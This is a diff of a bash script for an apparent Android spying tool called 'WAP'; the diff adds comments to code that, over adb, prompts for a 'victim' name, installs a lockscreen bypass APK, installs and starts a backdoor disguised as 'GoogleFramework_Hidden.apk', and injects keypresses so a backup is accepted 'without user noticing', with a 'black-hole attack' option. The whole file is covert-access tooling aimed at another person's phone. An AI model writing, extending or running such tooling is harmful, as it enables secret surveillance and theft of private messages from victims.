@@ -7,10 +7,13 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 CYAN='\033[0;36m'
 #Beginning of function definitions
+# -i option of backdoor prompt and variable definition
 BACKDOORMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}USE BACKDOOR APK?${CYAN}${NONE}[Y|N]:"
 	read BACKDOOR
 }
+
+#Determine if backdoor is already installed on victim device, if it is, restart it, otherwise, install it.
 BD(){
 	if [[ -z "$BACKDOOR" ]]; then
 		BACKDOORMENU
@@ -30,6 +33,8 @@ BD(){
 		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && INSTALLBACKDOOR ;;
 	esac
 }
+
+#Same as above but without returning to interface, maybe there is another better way to this this, working on it.
 BD2(){
 	bin/adb shell ps my.app.client > tmp/filesizebackdoor.txt
 	FILEBACKDOOR=tmp/filesizebackdoor.txt
@@ -44,14 +49,20 @@ BD2(){
 	fi
 	rm -f tmp/filesizebackdoor.txt
 }
+
+#Pause required.
 PAUSE(){
 	echo -e -n "\n\n${CYAN}WAP${NONE}>${BOLD}PRESS ${CYAN}[ENTER]${NONE} ${BOLD}WHEN YOU HAVE DISCONNECTED THE DEVICE ...${NONE}"
 	read
 }
+
+#Prompt for victim name.
 VICTIM(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}ENTER THE NAME OF THE VICTIM${NONE}:"
 	read NAME
 }
+
+#Ask for path for extractions, it will override the one in config.
 OUTPUTDIR(){
 	bin/adb kill-server
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}ENTER THE PATH FOR EXTRACTION${NONE} ENDING WITH / [BLANK=DEFAULT=config]:"
@@ -68,6 +79,8 @@ OUTPUTDIR(){
 		PATHEXT="${HOME}/"
 	fi
 }
+
+#Get device info and install lockscreen exploit by Kos.io
 WHATSPWNREMOTE(){
 	bin/adb kill-server
 	if [[ -z "$NAME" ]]; then
@@ -84,6 +97,8 @@ WHATSPWNREMOTE(){
 	bin/adb install bin/AntiGuard.apk
 	BD
 }
+
+#Installs backdoor apk and start service
 INSTALLBACKDOOR(){
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb install bin/GoogleFramework_Hidden.apk
@@ -91,12 +106,16 @@ INSTALLBACKDOOR(){
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 	MAIN
 }
+
+#The same, headless
 INSTALLBACKDOOR2(){
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb install bin/GoogleFramework_Hidden.apk
 	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 }
+
+#Main script for extraction, injects key commands for automatic backup accept without user noticing
 MAIN(){
 	KEYCODESBACKUP(){
 		sleep 2
@@ -131,6 +150,8 @@ MAIN(){
 		B2NBHNDB
 	fi
 }
+
+
 BLACKHOLEMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}DO YOU WANT TO USE BLACK-HOLE ATTACK?${CYAN}${NONE}[Y|N]:"
 	read BLACKHOLE
